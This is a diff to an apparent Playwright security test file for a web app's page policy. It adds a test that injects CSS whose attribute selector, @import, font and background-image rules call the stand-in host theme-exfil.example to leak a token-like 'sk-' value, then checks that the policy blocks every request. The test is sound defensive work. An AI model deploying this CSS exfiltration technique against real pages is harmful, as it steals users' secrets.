@@ -4,7 +4,7 @@ import { createRecoveryFixture } from "./execution-recovery-fixtures.js";
 import { ONBOARDING_VERSION, seedBrowserSettings } from "./helpers/player.js";
 import { watchPolicyViolations } from "./helpers/page-policy.js";
 
-// The built app is under its page policy (the dev server is not). A screen
+// The built app is under its production page policy. A screen
 // that needs an inline script, a remote script or a frame from elsewhere
 // reports a violation here instead of failing silently for players.
 
@@ -94,4 +94,40 @@ test("a session with plugin panels runs without a policy violation", async ({
   } finally {
     await fixture.dispose();
   }
+});
+
+test("theme CSS cannot send selector matches to remote image or font hosts (F-009)", async ({
+  page,
+}) => {
+  const violations = await watchPolicyViolations(page);
+  await seed(page);
+  await open(page, "/");
+  let requests = 0;
+  await page.route("https://theme-exfil.example/**", async (route) => {
+    requests += 1;
+    await route.abort();
+  });
+  await page.evaluate(() => {
+    // Deliberately expose a synthetic match to exercise the second boundary,
+    // independently of the secret input's protection.
+    const probe = document.createElement("div");
+    probe.id = "theme-security-probe";
+    probe.setAttribute("data-probe", "sk-synthetic");
+    probe.textContent = "probe";
+    document.body.append(probe);
+    const style = document.createElement("style");
+    style.textContent = `
+      @import url("https://theme-exfil.example/style");
+      @font-face { font-family: Exfil; src: url("https://theme-exfil.example/font"); }
+      #theme-security-probe[data-probe^="sk-"] {
+        background-image: url("https://theme-exfil.example/image");
+        font-family: Exfil;
+      }
+    `;
+    document.head.append(style);
+  });
+  await expect.poll(() => violations.join("\n")).toContain("img-src");
+  await expect.poll(() => violations.join("\n")).toContain("font-src");
+  await expect.poll(() => violations.join("\n")).toContain("style-src");
+  expect(requests).toBe(0);
 });
